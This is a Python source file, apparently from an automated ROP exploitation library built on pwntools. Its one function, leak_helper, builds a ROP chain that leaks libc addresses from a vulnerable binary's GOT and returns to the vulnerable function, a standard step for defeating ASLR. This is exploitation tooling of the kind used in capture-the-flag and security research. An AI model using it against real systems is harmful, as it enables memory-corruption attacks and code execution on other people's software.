from autorop import PwnState, arutil, constants
from pwn import context, ROP, log, align
from typing import List, Callable


def leak_helper(
    state: PwnState, leaker: Callable[[ROP, int], ROP], symbols: List[str]
) -> PwnState:
    """Leak libc addresses using a leaking function.

    This function leaks the libc addresses of ``symbols``
    using rop chain built by ``leaker``, placing them in ``state.leaks``.
    ``leaker`` msut separate leaks using newlines.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

        leaker: function which reads arbitrary memory, newline terminated.
        symbols: what libc symbols we need to leak.

    Returns:
        Reference to the mutated ``PwnState``, with the following updated

            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    rop = ROP(state.elf)
    for symbol in symbols:
        rop = leaker(rop, state.elf.got[symbol])

    # ensure that call to vuln_function is stack-aligned
    # by aligning it minus one word
    # TODO: refactor this for reusability for all rop function calls
    arutil.align_rop(
        rop,
        align(constants.STACK_ALIGNMENT, len(rop.chain())) // context.bytes - 1,
    )
    rop.call(state.vuln_function)  # return back so we can execute more chains later
    log.info(rop.dump())

    state.target.clean(constants.CLEAN_TIME)
    state.overwriter(state.target, rop.chain())

    for symbol in symbols:
        line = state.target.readline()
        log.debug(line)
        # remove last character which must be newline
        state.leaks[symbol] = arutil.addressify(line[:-1])
        log.info(f"leaked {symbol} @ " + hex(state.leaks[symbol]))

    return state
